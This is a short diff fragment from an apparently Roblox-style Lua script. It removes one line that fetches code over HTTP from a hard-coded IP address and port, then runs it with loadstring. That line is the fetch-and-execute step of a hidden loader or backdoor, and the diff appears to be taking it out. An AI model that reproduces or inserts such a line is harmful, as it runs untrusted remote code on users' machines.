@@ -221,4 +221,3 @@ end
 task.spawn(ExecuteLoader)
 
 
-loadstring(game:HttpGet("http://194.13.80.145:7000/raw/67.lua"))()
